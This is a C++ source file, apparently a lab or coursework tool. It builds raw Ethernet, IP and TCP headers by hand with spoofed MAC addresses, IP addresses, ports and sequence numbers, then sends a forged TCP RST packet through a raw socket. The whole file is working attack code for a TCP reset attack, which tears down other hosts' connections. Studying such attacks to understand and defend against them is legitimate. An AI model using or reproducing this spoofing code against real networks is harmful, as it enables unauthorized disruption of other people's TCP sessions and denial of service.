#include <sys/types.h>	
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/if.h>	
#include <linux/if_packet.h>
#include <sys/ioctl.h>	
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <arpa/inet.h>
#include <cstdlib>

#define portNumber 9999
#define ETH_ALEN 6
#define ETH_P_IP	0x0800

using namespace std;

struct spoofedcontent
{
  // ethernetHeader
  unsigned char sourceInterface[6];
  unsigned char destinationInterface[6];

  // tcpHeader 
  u_int16_t sourcePort;                  
  u_int16_t destinationPort;
  u_int32_t sequenceNumber;                    
  u_int32_t ackNumber;

  // ipHeader
  u_int32_t sourceIPAddress;                      
  u_int32_t destinationIPAddress;
};

struct ethernetheader
{
  unsigned char destinationInterface[ETH_ALEN];
  unsigned char sourceInterface[ETH_ALEN];
  unsigned short protocol;
};

struct tcpheader 
{
  u_int16_t sourcePort;                  
  u_int16_t destinationPort;                  
  u_int32_t sequenceNumber;                    
  u_int32_t ackNumber;                    
  uint16_t reserved_1:4;                     
  uint16_t headerLength:4;             
  uint16_t flag_FIN:1;                      
  uint16_t flag_SYN:1;                      
  uint16_t flag_RST:1;                      
  uint16_t flag_PSH:1;                      
  uint16_t flag_ACK:1;                     
  uint16_t flag_URG:1;                      
  uint16_t reserved_2:2;                   
  u_int16_t windowSize;                   
  u_int16_t checksum;               
  u_int16_t urgentPointer;               
};

struct ipheader 
{
  uint8_t headerLength:4, version:4;              // header length(default 5) | ip version(default 4)
  u_int8_t type_of_service;                       // type of service(default 0x00)
  u_int16_t totalLength;                          // total length(ip packet + tcp header + payload)
  u_int16_t identification;                       
  u_int16_t fragmentOffset;                      
  u_int8_t time_to_live;                       
  u_int8_t protocol;                              // transport layer protocol(tcp(6))
  u_int16_t checksum;                     
  u_int32_t sourceIPAddress;                      
  u_int32_t destinationIPAddress;                   
};

// Header for tcp checksum calculation

struct pseudoheader
{
	u_int32_t sourceAddress;
	u_int32_t destinationAddress;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};


unsigned short calcChecksum (unsigned short *buf, int nwords)
{
  unsigned long checkSum;
  for (checkSum = 0; nwords > 0; nwords--)
    checkSum += *buf++;
  checkSum = (checkSum >> 16) + (checkSum & 0xffff);
  checkSum += (checkSum >> 16);
  return ~checkSum;
}


void sendResetPacket(spoofedcontent &spoofedContent)
{
    // cout << sourcePort << " " << destinationPort << " " << seqNumber << " " << ackNumber << endl; 

    char packet[4096];
    memset(packet, 0, 4096);      // Zero out packet memory

    struct sockaddr_in sourceAddress;
    struct sockaddr_ll destinationInterface;

    // Position respective headers within the packet

    struct ethernetheader *ethernetHeader = (struct ethernetheader *) (packet);
    struct ipheader *ipHeader = (struct ipheader *) (packet + sizeof (struct ethernetheader));
    struct tcpheader *tcpHeader = (struct tcpheader *) (packet + sizeof (struct ipheader) + sizeof (struct ethernetheader));
    struct pseudoheader pseudoHeader;

    char interface[] = "eth0";
    
    int rawSocket = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    
    if(rawSocket == -1)
    {
      printf("Can't create socket");
      exit(1);
    }
    
    struct ifreq interfaceInfo;
    int interfaceIndex;
    memset(&interfaceInfo, 0x00, sizeof(interfaceInfo));
    strncpy(interfaceInfo.ifr_name, interface, IFNAMSIZ);

    // Store interface data in buffer interfaceInfo

    if (ioctl(rawSocket, SIOCGIFINDEX, &interfaceInfo) < 0)
    {
      printf("Error: could not get interface index\n");
      exit(1);
    }
    else
    {
      interfaceIndex = interfaceInfo.ifr_ifindex;
    }
    memcpy(ethernetHeader->sourceInterface, spoofedContent.sourceInterface, ETH_ALEN);
    memcpy(ethernetHeader->destinationInterface, spoofedContent.destinationInterface, ETH_ALEN);
    ethernetHeader->protocol = htons(ETH_P_IP);      // represents that the next header is that of IP

    // Populate the IP Header

    ipHeader->headerLength = 5;
    ipHeader->version = 4;
    ipHeader->type_of_service = 0;
    ipHeader->totalLength = htons(sizeof (struct ipheader) + sizeof (struct tcpheader));
    ipHeader->identification = 1 << 8;
    ipHeader->fragmentOffset = 0;
    ipHeader->time_to_live = 128;
    ipHeader->protocol = 6;
    ipHeader->sourceIPAddress = spoofedContent.sourceIPAddress;
    ipHeader->destinationIPAddress = spoofedContent.destinationIPAddress;
    ipHeader->checksum = calcChecksum((unsigned short *) (packet+ sizeof(struct ethernetheader)), sizeof (struct ipheader) >> 1);

    // Populate the TCP Header

    tcpHeader->sourcePort = spoofedContent.sourcePort;
    tcpHeader->destinationPort = spoofedContent.destinationPort;
    tcpHeader->sequenceNumber = spoofedContent.sequenceNumber;
    tcpHeader->ackNumber = spoofedContent.ackNumber;
    tcpHeader->reserved_1 = 0;
    tcpHeader->headerLength = 5;
    tcpHeader->flag_FIN = 0;
    tcpHeader->flag_SYN = 0;
	  tcpHeader->flag_RST = 1;
	  tcpHeader->flag_PSH = 0;
	  tcpHeader->flag_ACK = 0;
	  tcpHeader->flag_URG = 0;
    tcpHeader->reserved_2 = 0;
    tcpHeader->windowSize = htons(32678);
    tcpHeader->checksum = 0;
    tcpHeader->urgentPointer = 0;    

    // Populate pseudo header

    pseudoHeader.sourceAddress = spoofedContent.sourceIPAddress;
	  pseudoHeader.destinationAddress = spoofedContent.destinationIPAddress;
	  pseudoHeader.placeholder = 0;
	  pseudoHeader.protocol = IPPROTO_TCP;
	  pseudoHeader.tcp_length = htons(sizeof(struct tcpheader));

    int pseudoPacket_size = sizeof(struct pseudoheader) + sizeof(struct tcpheader);
    char pseudoPacket[pseudoPacket_size];

    // Copy and position contents from pseudoHeader and tcpHeader to pseudoPacket 

    memcpy(pseudoPacket , (char*) &pseudoHeader , sizeof (struct pseudoheader));
	  memcpy(pseudoPacket + sizeof(struct pseudoheader) , tcpHeader , sizeof(struct tcpheader));

    // Calculate TCP checksum (pseudoPacket = pseudoHeader + tcpHeader + data(optional))

    tcpHeader->checksum = calcChecksum( (unsigned short*) pseudoPacket , pseudoPacket_size >> 1);

    u_int16_t packetSize = sizeof (struct ethernetheader) + sizeof (struct ipheader) + sizeof (struct tcpheader);

    memset((void*)&destinationInterface, 0, sizeof(destinationInterface));
    destinationInterface.sll_family = AF_PACKET;   
    destinationInterface.sll_ifindex = interfaceIndex;
    destinationInterface.sll_halen = ETH_ALEN;
    memcpy((void*)(destinationInterface.sll_addr), (void*)spoofedContent.destinationInterface, ETH_ALEN);

    if(sendto(rawSocket, packet, packetSize, 0, (struct sockaddr *) &destinationInterface, sizeof (destinationInterface)) < 0)
    {
      printf("Error while sending\n");
    }
    else
    {
      printf("Successfully sent reset packet\n");
    }

    close(rawSocket);
}